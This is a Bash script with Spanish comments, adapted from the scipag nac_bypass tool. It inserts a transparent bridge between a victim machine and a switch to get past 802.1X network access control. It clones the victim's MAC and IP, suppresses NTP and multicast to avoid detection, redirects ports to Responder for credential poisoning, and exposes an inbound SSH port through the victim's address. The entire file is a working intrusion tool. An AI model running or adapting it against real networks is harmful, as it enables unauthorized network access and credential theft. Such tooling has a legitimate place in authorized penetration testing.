#!/bin/bash
if [[ $EUID -ne 0 ]]; then
  echo "[!] Este script debe ejecutarse como root."
  exit 1
fi

# -----------------------------------------------------------------------------
# Basado en: https://github.com/scipag/nac_bypass
# Ajustes sobre el script original:
#   - Mensajes de conexión afinados para indicar el orden de cables y reducir
#     alertas de MAC desconocida al enganchar cliente y switch.
#   - Creación de un namespace "bypass" con macvlan dedicada tras fase_conexion,
#     aislando el tráfico del operador.
#   - Rutina de limpieza ampliada para eliminar namespace, macvlan y ficheros
#     auxiliares, facilitando ejecuciones repetidas sin residuos.
# -----------------------------------------------------------------------------

# --- Variables de configuración --------------------------------------------
VERSION="0.6.5-1715949302"

CMD_TABLAS_ARP=/usr/sbin/arptables
CMD_TABLAS_EB=/usr/sbin/ebtables
CMD_TABLAS_IP=/usr/sbin/iptables

# Paleta de colores para mensajes legibles en terminal.
COLOR_REINICIO="\e[0m" # restablecer texto
COLOR_EXITO="\e[1;32m" # verde
COLOR_INFO="\e[1;34m" # azul
COLOR_ALERTA="\e[1;31m" # rojo
COLOR_INDICACION="\e[1;36m" # cian

INTERFAZ_PUENTE=br0 # interfaz del puente
INTERFAZ_SWITCH=eth0 # interfaz de red conectada al switch
MAC_SWITCH=00:11:22:33:44:55 # valor inicial, se establece durante la inicialización
INTERFAZ_CLIENTE=eth1 # interfaz de red conectada a la máquina víctima

IP_PUENTE=169.254.66.66 # dirección IP para el puente
PUERTA_ENLACE_PUENTE=169.254.66.1 # dirección IP de la puerta de enlace del puente

ARCHIVO_CAPTURA=/tmp/tcpdump.pcap
OPCION_RESPONDER=0        # Activa la redirección de puertos para Responder
OPCION_SSH=0              # Habilita redirección y arranque de OpenSSH
OPCION_AUTONOMA=0         # Suprime interacción manual y mensajes extra
OPCION_SOLO_CONEXION=0    # Ejecuta únicamente la segunda fase del bypass
OPCION_SOLO_INICIAL=0     # Ejecuta únicamente la fase inicial
OPCION_REINICIO=0         # Restablece el entorno y sale

# Puertos de interés analizados durante la captura inicial.
PUERTO_TCPDUMP_1=88
PUERTO_TCPDUMP_2=445

# Puertos que Responder suele necesitar para envenenamiento y autenticación.
PUERTO_UDP_NETBIOS_NS=137
PUERTO_UDP_NETBIOS_DS=138
PUERTO_UDP_DNS=53
PUERTO_UDP_LDAP=389
PUERTO_TCP_LDAP=389
PUERTO_TCP_SQL=1433
PUERTO_UDP_SQL=1434
PUERTO_TCP_HTTP=80
PUERTO_TCP_HTTPS=443
PUERTO_TCP_SMB=445
PUERTO_TCP_NETBIOS_SS=139
PUERTO_TCP_FTP=21
PUERTO_TCP_SMTP1=25
PUERTO_TCP_SMTP2=587
PUERTO_TCP_POP3=110
PUERTO_TCP_IMAP=143
PUERTO_TCP_PROXY=3128
PUERTO_UDP_MULTIDIFUSION=5553

PUERTO_RETORNO_SSH=50222 # puerto de retorno SSH usa victimip:50022 para conectar attackerbox:sshport
PUERTO_SSH=50022
RANGO_PUERTOS_NAT=61000-62000 # puertos para mi tráfico en el NAT

# --- Funciones de utilidad --------------------------------------------------
mostrar_ayuda() {
  echo -e "$0 v$VERSION uso:"
  echo "    -1 <eth>    interfaz de red conectada al switch"
  echo "    -2 <eth>    interfaz de red conectada a la máquina víctima"
  echo "    -a          modo autónomo"
  echo "    -c          iniciar solo la configuración de conexión"
  echo "    -g <MAC>    establecer manualmente la dirección MAC de la puerta de enlace (MAC_PUERTA_ENLACE)"
  echo "    -h          muestra esta ayuda"
  echo "    -i          iniciar solo la configuración inicial"
  echo "    -r          restablecer todos los ajustes"
  echo "    -R          habilitar redirección de puertos para Responder"
  echo "    -S          habilitar redirección de puertos para OpenSSH e iniciar el servicio"
  exit 0
}

## mostrar información de versión
mostrar_version() {
  echo -e "$0 v$VERSION"
  exit 0
}

# Analiza los parámetros recibidos y ajusta las banderas de ejecución.
analizar_argumentos() {
  while getopts ":1:2:acg:hirRS" option; do
    case "$option" in
      1)
        INTERFAZ_SWITCH=$OPTARG
        ;;
      2)
        INTERFAZ_CLIENTE=$OPTARG
        ;;
      a)
        OPCION_AUTONOMA=1
        ;;
      c)
        OPCION_SOLO_CONEXION=1
        ;;
      g)
        MAC_PUERTA_ENLACE=$OPTARG
        ;;
      h)
        mostrar_ayuda
        ;;
      i)
        OPCION_SOLO_INICIAL=1
        ;;
      r)
        OPCION_REINICIO=1
        ;;
      R)
        OPCION_RESPONDER=1
        ;;
      S)
        OPCION_SSH=1
        ;;
      *)
        OPCION_RESPONDER=0
        OPCION_SSH=0
        OPCION_AUTONOMA=0
        ;;
    esac
  done
}

# --- Fase 1: Preparar la infraestructura de puente -------------------------
fase_inicial() {
  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Iniciando procedimiento de bypass NAC.$COLOR_REINICIO"
    echo
  fi

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Ejecutando tareas de preparación.$COLOR_REINICIO"
    echo
  fi

  systemctl stop NetworkManager.service
  cp /etc/sysctl.conf /etc/sysctl.conf.bak
  echo "net.ipv6.conf.all.disable_ipv6 = 1" > /etc/sysctl.conf
  sysctl -p
  echo "" > /etc/resolv.conf

  # Desactivar multidifusión en ambas interfaces para que la red no reciba IGMP iniciales.
  ip link set "$INTERFAZ_SWITCH" multicast off
  ip link set "$INTERFAZ_CLIENTE" multicast off

  # Pausar servicios NTP habituales; cualquier sincronización automática puede delatar la presencia.
  declare -a SERVICIOS_NTP=("ntp.service" "ntpsec.service" "chronyd.service" "systemd-timesyncd.service")
  for SERVICIO in "${SERVICIOS_NTP[@]}"; do
    ESTADO_SERVICIO=$(systemctl is-active "$SERVICIO")
    if [[ $ESTADO_SERVICIO == "active" ]]; then
      systemctl stop "$SERVICIO"
    fi
  done
  timedatectl set-ntp false

  # Obtener automáticamente la dirección MAC física del puerto hacia el switch.
  MAC_SWITCH=$(ifconfig "$INTERFAZ_SWITCH" | grep -i ether | awk '{ print $2 }')

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_EXITO [ + ] Preparación completada.$COLOR_REINICIO"
    echo
  fi

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Configurando el bridge principal.$COLOR_REINICIO"
    echo
  fi

  brctl addbr "$INTERFAZ_PUENTE"                              # crear puente virtual
  brctl addif "$INTERFAZ_PUENTE" "$INTERFAZ_CLIENTE"          # añadir interfaz del cliente
  brctl addif "$INTERFAZ_PUENTE" "$INTERFAZ_SWITCH"          # añadir interfaz hacia el switch

  echo 8 > "/sys/class/net/${INTERFAZ_PUENTE}/bridge/group_fwd_mask"            # reenviar tramas EAP para 802.1X
  echo 1 > /proc/sys/net/bridge/bridge-nf-call-iptables

  ifconfig "$INTERFAZ_CLIENTE" 0.0.0.0 up promisc              # levantar interfaz del cliente en modo promiscuo
  ifconfig "$INTERFAZ_SWITCH" 0.0.0.0 up promisc              # levantar interfaz del switch en modo promiscuo

  macchanger -m 00:12:34:56:78:90 "$INTERFAZ_PUENTE"          # valor inicial neutro
  macchanger -m "$MAC_SWITCH" "$INTERFAZ_PUENTE"              # suplantar la MAC del lado del switch

  ifconfig "$INTERFAZ_PUENTE" 0.0.0.0 up promisc

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_EXITO [ + ] Bridge inicializado en modo pasivo.$COLOR_REINICIO"
    echo
    echo -e "$COLOR_INDICACION [ # ] Orden recomendado: conectar $INTERFAZ_CLIENTE al cliente y, a continuación, $INTERFAZ_SWITCH al switch.$COLOR_REINICIO"
    echo -e "$COLOR_INDICACION [ # ] Verifique enlace y actividad LED en ambas interfaces antes de continuar.$COLOR_REINICIO"
    echo -e "$COLOR_INDICACION [ # ] Espere ~30 segundos para la negociación de enlace y pulse cualquier tecla para proseguir.$COLOR_REINICIO"
    echo -e "$COLOR_ALERTA [ ! ] Confirme que el equipo objetivo mantiene conectividad antes de avanzar.$COLOR_REINICIO"
    echo -e "$COLOR_INFO [ * ] Supervisando tramas EAPOL en $INTERFAZ_CLIENTE para validar la autenticación.$COLOR_REINICIO"
    echo -e "$COLOR_INDICACION [ # ] Pulse cualquier tecla para detener la supervisión y continuar.$COLOR_REINICIO"

    local PID_MONITOREO_EAPOL=""
    local TCPDUMP_MONITOREO_ARGS=(-i "$INTERFAZ_CLIENTE" -l -nn -e -vvv -s0 -tttt ether proto 0x888e)
    trap '[[ -n "$PID_MONITOREO_EAPOL" ]] && kill -INT "$PID_MONITOREO_EAPOL" 2>/dev/null' INT TERM
    tcpdump "${TCPDUMP_MONITOREO_ARGS[@]}" &
    PID_MONITOREO_EAPOL=$!

    read -r -s -n1
    echo
    if kill -0 "$PID_MONITOREO_EAPOL" 2>/dev/null; then
      kill -INT "$PID_MONITOREO_EAPOL" 2>/dev/null
      wait "$PID_MONITOREO_EAPOL" 2>/dev/null
    fi
    trap - INT TERM
  else
    sleep 25s
  fi
}

# --- Fase 2: Clonar identidad ----------------------
fase_conexion() {

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Restableciendo enlaces en $INTERFAZ_CLIENTE y $INTERFAZ_SWITCH.$COLOR_REINICIO"
    echo -e "$COLOR_INFO [ * ] Reiniciando interfaces para forzar renegociación en modo promiscuo.$COLOR_REINICIO"
    echo
  fi

  for IFACE in "$INTERFAZ_CLIENTE" "$INTERFAZ_SWITCH"; do
    if ip link set "$IFACE" down 2>/dev/null; then
      [[ "$OPCION_AUTONOMA" -eq 0 ]] && echo -e "$COLOR_INDICACION [ # ] $IFACE se ha desactivado correctamente.$COLOR_REINICIO"
    else
      [[ "$OPCION_AUTONOMA" -eq 0 ]] && echo -e "$COLOR_ALERTA [ ! ] No fue posible desactivar $IFACE.$COLOR_REINICIO"
    fi
  done

  sleep 1

  for IFACE in "$INTERFAZ_CLIENTE" "$INTERFAZ_SWITCH"; do
    if ip link set "$IFACE" up 2>/dev/null; then
      ip link set "$IFACE" promisc on 2>/dev/null
      local ESTADO_IFACE
      ESTADO_IFACE=$(cat "/sys/class/net/${IFACE}/operstate" 2>/dev/null)
      [[ "$OPCION_AUTONOMA" -eq 0 ]] && echo -e "$COLOR_EXITO [ + ] $IFACE activo (estado: ${ESTADO_IFACE:-desconocido}).$COLOR_REINICIO"
    else
      [[ "$OPCION_AUTONOMA" -eq 0 ]] && echo -e "$COLOR_ALERTA [ ! ] No fue posible activar $IFACE.$COLOR_REINICIO"
    fi
  done

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
  fi

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Capturando tráfico TCP inicial.$COLOR_REINICIO"
    echo
  fi

  ## Capturar PCAP y buscar paquetes SYN provenientes de la máquina víctima para obtener la IP de origen, la MAC de origen y la MAC de la puerta de enlace
  # TODO: ¿Reemplazar esto con tcp SYN O (udp && no broadcast? hay que distinguir origen y destino)
  # TODO: ¿Sustituirlo obteniendo los datos directamente de la interfaz de origen?
  tcpdump -i "$INTERFAZ_CLIENTE" -s0 -w "$ARCHIVO_CAPTURA" -c1 'tcp[13] & 2 != 0'

  MAC_CLIENTE=$(tcpdump -r "$ARCHIVO_CAPTURA" -nne -c 1 tcp | awk '{print $2","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $1}')
  if [[ -z "$MAC_PUERTA_ENLACE" ]]; then
    MAC_PUERTA_ENLACE=$(tcpdump -r "$ARCHIVO_CAPTURA" -nne -c 1 tcp | awk '{print $2","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $2}')
  fi
  IP_CLIENTE=$(tcpdump -r "$ARCHIVO_CAPTURA" -nne -c 1 tcp | awk '{print $3","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $3}')
  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Procesando captura y actualizando parámetros.$COLOR_REINICIO"
    echo -e "$COLOR_INFO [ * ] MAC_CLIENTE: $MAC_CLIENTE | MAC_PUERTA_ENLACE: $MAC_PUERTA_ENLACE | IP_CLIENTE: $IP_CLIENTE $COLOR_REINICIO"
    echo
  fi

  ## entrar en silencio
  $CMD_TABLAS_ARP -A OUTPUT -o "$INTERFAZ_SWITCH" -j DROP
  $CMD_TABLAS_ARP -A OUTPUT -o "$INTERFAZ_CLIENTE" -j DROP
  $CMD_TABLAS_IP -A OUTPUT -o "$INTERFAZ_CLIENTE" -j DROP
  $CMD_TABLAS_IP -A OUTPUT -o "$INTERFAZ_SWITCH" -j DROP

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Aplicando IP del bridge, traducción L2 y ruta predeterminada.$COLOR_REINICIO"
    echo
  fi
  ifconfig "$INTERFAZ_PUENTE" "$IP_PUENTE" up promisc

  ## configurar reescritura de Capa 2
  ## Si el script se llamó con -c, necesitamos encontrar la MAC de la interfaz hacia el switch.
  if [[ "$OPCION_SOLO_CONEXION" -eq 1 ]]; then
    MAC_SWITCH=$(ifconfig "$INTERFAZ_SWITCH" | grep -i ether | awk '{ print $2 }')
  fi
  $CMD_TABLAS_EB -t nat -A POSTROUTING -s "$MAC_SWITCH" -o "$INTERFAZ_SWITCH" -j snat --to-src "$MAC_CLIENTE"
  $CMD_TABLAS_EB -t nat -A POSTROUTING -s "$MAC_SWITCH" -o "$INTERFAZ_PUENTE" -j snat --to-src "$MAC_CLIENTE"

  ## crear rutas predeterminadas para encaminar el tráfico: todo el tráfico va a la puerta de enlace del puente y se envía en Capa 2 a MAC_PUERTA_ENLACE
  arp -s -i "$INTERFAZ_PUENTE" "$PUERTA_ENLACE_PUENTE" "$MAC_PUERTA_ENLACE"
  route add default gw "$PUERTA_ENLACE_PUENTE" dev "$INTERFAZ_PUENTE" metric 10

  ## --- Reglas de redirección controladas por flags ---

  # Redirección SSH (-S)
  if [[ "$OPCION_SSH" -eq 1 ]]; then
    if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
      echo
      echo -e "$COLOR_INFO [ * ] Habilitando redirección SSH entrante en $IP_CLIENTE:$PUERTO_RETORNO_SSH y arrancando OpenSSH.$COLOR_REINICIO"
      echo
    fi
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" \
      -p tcp --dport "$PUERTO_RETORNO_SSH" -j DNAT --to "$IP_PUENTE:$PUERTO_SSH"

    systemctl start ssh.service 2>/dev/null || true
  fi

  # Redirección Responder (-R)
  if [[ "$OPCION_RESPONDER" -eq 1 ]]; then
    if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
      echo
      echo -e "$COLOR_INFO [ * ] Habilitando redirección de puertos para Responder.$COLOR_REINICIO"
      echo
    fi

    PUERTOS_RESPONDER_UDP=($PUERTO_UDP_NETBIOS_NS $PUERTO_UDP_NETBIOS_DS $PUERTO_UDP_DNS \
                           $PUERTO_UDP_LDAP $PUERTO_UDP_SQL $PUERTO_UDP_MULTIDIFUSION)
    PUERTOS_RESPONDER_TCP=($PUERTO_TCP_LDAP $PUERTO_TCP_SQL $PUERTO_TCP_HTTP $PUERTO_TCP_HTTPS \
                           $PUERTO_TCP_SMB $PUERTO_TCP_NETBIOS_SS $PUERTO_TCP_FTP \
                           $PUERTO_TCP_SMTP1 $PUERTO_TCP_SMTP2 $PUERTO_TCP_POP3 \
                           $PUERTO_TCP_IMAP $PUERTO_TCP_PROXY)

    for p in "${PUERTOS_RESPONDER_UDP[@]}"; do
      $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" \
        -p udp --dport "$p" -j DNAT --to "$IP_PUENTE:$p"
    done
    for p in "${PUERTOS_RESPONDER_TCP[@]}"; do
      $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" \
        -p tcp --dport "$p" -j DNAT --to "$IP_PUENTE:$p"
    done
  fi

  ## --- NAT saliente controlado ---
  # Solo traducir tráfico originado desde IP_PUENTE (namespace), no todo el host.
  $CMD_TABLAS_IP -t nat -A POSTROUTING -o "$INTERFAZ_PUENTE" -s "$IP_PUENTE" \
    -p tcp -j SNAT --to "$IP_CLIENTE:$RANGO_PUERTOS_NAT"
  $CMD_TABLAS_IP -t nat -A POSTROUTING -o "$INTERFAZ_PUENTE" -s "$IP_PUENTE" \
    -p udp -j SNAT --to "$IP_CLIENTE:$RANGO_PUERTOS_NAT"
  $CMD_TABLAS_IP -t nat -A POSTROUTING -o "$INTERFAZ_PUENTE" -s "$IP_PUENTE" \
    -p icmp -j SNAT --to "$IP_CLIENTE"

  ## INICIAR SSH
  if [[ "$OPCION_SSH" -eq 1 ]]; then
    systemctl start ssh.service
  fi

  ## Finalizar
  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_EXITO [ + ] Configuración finalizada. Validar conectividad y servicios antes de operar.$COLOR_REINICIO"
    echo
  fi

  ## Restablecer el flujo de tráfico; supervisar puertos por bloqueo
  $CMD_TABLAS_ARP -D OUTPUT -o "$INTERFAZ_SWITCH" -j DROP
  $CMD_TABLAS_ARP -D OUTPUT -o "$INTERFAZ_CLIENTE" -j DROP
  $CMD_TABLAS_IP -D OUTPUT -o "$INTERFAZ_CLIENTE" -j DROP
  $CMD_TABLAS_IP -D OUTPUT -o "$INTERFAZ_SWITCH" -j DROP

  ## Limpieza
  rm "$ARCHIVO_CAPTURA"

  ## Crear namespace y macvlan aislados para el operador
  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Construyendo namespace aislado \"bypass\" para operaciones controladas.$COLOR_REINICIO"
    echo
  fi

  local NS_NOMBRE="bypass"
  local NS_INTERFAZ="mv0"
  local NS_DIR="/etc/netns/${NS_NOMBRE}"
  local NS_CLEANUP_CMD="ip netns delete ${NS_NOMBRE}"
  local NS_RECURSOS_OK=1
  local NS_CMD_FALTAN=()
  local NS_IP_CIDR=""
  local NS_GATEWAY="$PUERTA_ENLACE_PUENTE"

  local NS_COMANDOS=("ip" "brctl" "macchanger" "tcpdump" "ebtables" "iptables")
  for CMD_NS in "${NS_COMANDOS[@]}"; do
    if ! command -v "$CMD_NS" >/dev/null 2>&1; then
      NS_CMD_FALTAN+=("$CMD_NS")
    fi
  done
  if ! ip netns list >/dev/null 2>&1; then
    NS_CMD_FALTAN+=("ip netns")
  fi

  if [[ ${#NS_CMD_FALTAN[@]} -gt 0 ]]; then
    echo -e "$COLOR_ALERTA [ ! ] Dependencias ausentes para el namespace (${NS_CMD_FALTAN[*]}). Se omite la creación y se continúa con el flujo principal.$COLOR_REINICIO"
    NS_RECURSOS_OK=0
  fi

  if [[ "$NS_RECURSOS_OK" -eq 1 ]]; then
    if ! ip link show "$INTERFAZ_PUENTE" >/dev/null 2>&1; then
      echo -e "$COLOR_ALERTA [ ! ] $INTERFAZ_PUENTE no está disponible; no se creará la macvlan $NS_INTERFAZ.$COLOR_REINICIO"
      NS_RECURSOS_OK=0
    fi
  fi

  if [[ "$NS_RECURSOS_OK" -eq 1 ]]; then
    ip netns list | grep -qw "$NS_NOMBRE" && ip netns delete "$NS_NOMBRE"
    ip link show "$NS_INTERFAZ" >/dev/null 2>&1 && ip link delete "$NS_INTERFAZ"

    if ! ip netns add "$NS_NOMBRE"; then
      echo -e "$COLOR_ALERTA [ ! ] No fue posible crear el namespace $NS_NOMBRE.$COLOR_REINICIO"
      NS_RECURSOS_OK=0
    fi
  fi

  if [[ "$NS_RECURSOS_OK" -eq 1 ]]; then
    if ! ip link add "$NS_INTERFAZ" link "$INTERFAZ_PUENTE" type macvlan mode bridge 2>/dev/null; then
      echo -e "$COLOR_ALERTA [ ! ] No fue posible crear la macvlan $NS_INTERFAZ sobre $INTERFAZ_PUENTE.$COLOR_REINICIO"
      ip netns delete "$NS_NOMBRE" 2>/dev/null
      NS_RECURSOS_OK=0
    fi
  fi

  if [[ "$NS_RECURSOS_OK" -eq 1 ]]; then
    if [[ -n "$MAC_CLIENTE" ]]; then
      ip link set "$NS_INTERFAZ" address "$MAC_CLIENTE" 2>/dev/null || echo -e "$COLOR_ALERTA [ ! ] No se pudo asignar la MAC legítima a $NS_INTERFAZ.$COLOR_REINICIO"
    else
      echo -e "$COLOR_ALERTA [ ! ] MAC_CLIENTE no definido; $NS_INTERFAZ empleará la MAC por defecto.$COLOR_REINICIO"
    fi
    ip link set "$NS_INTERFAZ" promisc on 2>/dev/null
    if ! ip link set "$NS_INTERFAZ" netns "$NS_NOMBRE" 2>/dev/null; then
      echo -e "$COLOR_ALERTA [ ! ] No fue posible mover $NS_INTERFAZ al namespace $NS_NOMBRE.$COLOR_REINICIO"
      ip link delete "$NS_INTERFAZ" 2>/dev/null
      ip netns delete "$NS_NOMBRE" 2>/dev/null
      NS_RECURSOS_OK=0
    fi
  fi

  if [[ "$NS_RECURSOS_OK" -eq 1 ]]; then
    if ! ip netns exec "$NS_NOMBRE" ip link set "$NS_INTERFAZ" up 2>/dev/null; then
      echo -e "$COLOR_ALERTA [ ! ] No fue posible activar $NS_INTERFAZ dentro del namespace.$COLOR_REINICIO"
      NS_RECURSOS_OK=0
    fi
    if [[ -n "$IP_CLIENTE" ]]; then
      if [[ "$IP_CLIENTE" == */* ]]; then
        NS_IP_CIDR="$IP_CLIENTE"
      elif [[ -n "${IP_CLIENTE_PREFIJO:-}" ]]; then
        NS_IP_CIDR="${IP_CLIENTE}/${IP_CLIENTE_PREFIJO}"
      else
        NS_IP_CIDR="${IP_CLIENTE}/32"
      fi
      ip netns exec "$NS_NOMBRE" ip addr flush dev "$NS_INTERFAZ" scope global 2>/dev/null
      ip netns exec "$NS_NOMBRE" ip addr add "$NS_IP_CIDR" dev "$NS_INTERFAZ" 2>/dev/null || echo -e "$COLOR_ALERTA [ ! ] No se pudo asignar la IP del cliente a $NS_INTERFAZ.$COLOR_REINICIO"
    else
      echo -e "$COLOR_ALERTA [ ! ] IP_CLIENTE no definido; el namespace carecerá de direccionamiento propio.$COLOR_REINICIO"
    fi

    if [[ -n "$NS_GATEWAY" ]]; then
      ip netns exec "$NS_NOMBRE" ip route replace "$NS_GATEWAY"/32 dev "$NS_INTERFAZ" scope link 2>/dev/null || true
      ip netns exec "$NS_NOMBRE" ip route replace default via "$NS_GATEWAY" dev "$NS_INTERFAZ" 2>/dev/null || echo -e "$COLOR_ALERTA [ ! ] No fue posible establecer la ruta por defecto dentro del namespace.$COLOR_REINICIO"
      if [[ -n "$MAC_PUERTA_ENLACE" ]]; then
        ip netns exec "$NS_NOMBRE" arp -s "$NS_GATEWAY" "$MAC_PUERTA_ENLACE" dev "$NS_INTERFAZ" 2>/dev/null || true
      fi
    else
      echo -e "$COLOR_ALERTA [ ! ] PUERTA_ENLACE_PUENTE no definido; no se configurará ruta por defecto en el namespace.$COLOR_REINICIO"
    fi
  fi

  if [[ "$NS_RECURSOS_OK" -eq 1 ]]; then
    if mkdir -p "$NS_DIR"; then
      echo "nameserver 8.8.8.8" > "$NS_DIR/resolv.conf"
    else
      echo -e "$COLOR_ALERTA [ ! ] No fue posible preparar /etc/netns para el namespace.$COLOR_REINICIO"
    fi
  fi

  if [[ "$NS_RECURSOS_OK" -eq 1 ]]; then
    # Evitar fugas solo en interfaces del bridge, sin bloquear el tráfico global del host
    ebtables -t filter -C OUTPUT -o "$INTERFAZ_PUENTE" -s "$MAC_SWITCH" -j DROP 2>/dev/null || \
      ebtables -t filter -A OUTPUT -o "$INTERFAZ_PUENTE" -s "$MAC_SWITCH" -j DROP

    ip netns exec "$NS_NOMBRE" ip -br addr show "$NS_INTERFAZ" 2>/dev/null || true
    echo -e "$COLOR_EXITO [ + ] Namespace \"$NS_NOMBRE\" disponible para uso operativo.$COLOR_REINICIO"
    echo -e "$COLOR_INDICACION [ # ] Acceso interactivo: sudo ip netns exec $NS_NOMBRE bash$COLOR_REINICIO"
    echo -e "$COLOR_INDICACION [ # ] Ejecución de comandos: sudo ip netns exec $NS_NOMBRE <comando>$COLOR_REINICIO"
    echo -e "$COLOR_INDICACION [ # ] Verificación de red: sudo ip netns exec $NS_NOMBRE ping -c1 <gateway_o_objetivo>$COLOR_REINICIO"
    echo -e "$COLOR_INDICACION [ # ] Limpieza recomendada: sudo $NS_CLEANUP_CMD$COLOR_REINICIO"
    echo -e "$COLOR_INFO [ * ] Utilice exclusivamente el namespace para el tráfico operativo.$COLOR_REINICIO"
  else
    echo -e "$COLOR_ALERTA [ ! ] No se configuró el namespace. Ejecute la limpieza manual: sudo $NS_CLEANUP_CMD$COLOR_REINICIO"
  fi

  ## Listo
  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INDICACION [ * ] Configuración lista. Continúe con las acciones planificadas.$COLOR_REINICIO"
    echo
  fi
}

# --- Rutina de limpieza completa -------------------------------------------
restablecer_configuracion() {
  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Iniciando rutina completa de restauración.$COLOR_REINICIO"
    echo
  fi

  ## derribar el puente
  ifconfig "$INTERFAZ_PUENTE" down
  brctl delbr "$INTERFAZ_PUENTE"

  ## eliminar ruta predeterminada
  arp -d -i "$INTERFAZ_PUENTE" "$PUERTA_ENLACE_PUENTE" "$MAC_PUERTA_ENLACE"
  route del default dev "$INTERFAZ_PUENTE"

  # Vaciar EB, ARP e IPTABLES
  $CMD_TABLAS_EB -F 2>/dev/null
  $CMD_TABLAS_EB -t nat -F 2>/dev/null
  $CMD_TABLAS_ARP -F 2>/dev/null
  $CMD_TABLAS_IP -F 2>/dev/null
  $CMD_TABLAS_IP -X 2>/dev/null
  $CMD_TABLAS_IP -t nat -F 2>/dev/null
  $CMD_TABLAS_IP -t nat -X 2>/dev/null

  # Restaurar sysctl.conf
  cp /etc/sysctl.conf.bak /etc/sysctl.conf
  rm /etc/sysctl.conf.bak
  sysctl -p

  if command -v ip >/dev/null 2>&1; then
    if ip netns list 2>/dev/null | grep -qw "bypass"; then
      ip netns delete bypass
    fi
    ip link delete mv0 2>/dev/null || true
  fi
  rm -rf /etc/netns/bypass 2>/dev/null || true

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_EXITO [ + ] Restauración finalizada. El entorno vuelve a su estado inicial.$COLOR_REINICIO"
    echo
  fi
}

# --- Punto de entrada ------------------------------------------------------
analizar_argumentos "$@"

if [[ "$OPCION_REINICIO" -eq 0 && "$OPCION_SOLO_INICIAL" -eq 0 && "$OPCION_SOLO_CONEXION" -eq 0 ]]; then
  echo -e "$COLOR_INFO [ * ] Confirma que el cable hacia el switch está desconectado antes de continuar.$COLOR_REINICIO"
  read -r -p "[?] Pulsa ENTER cuando la conexión al switch esté desconectada." _
fi

if [[ "$OPCION_REINICIO" -eq 1 ]]; then
  restablecer_configuracion
  exit 0
fi

if [[ "$OPCION_SOLO_INICIAL" -eq 1 ]]; then
  fase_inicial
  exit 0
fi

if [[ "$OPCION_SOLO_CONEXION" -eq 1 ]]; then
  fase_conexion
  exit 0
fi

fase_inicial
fase_conexion
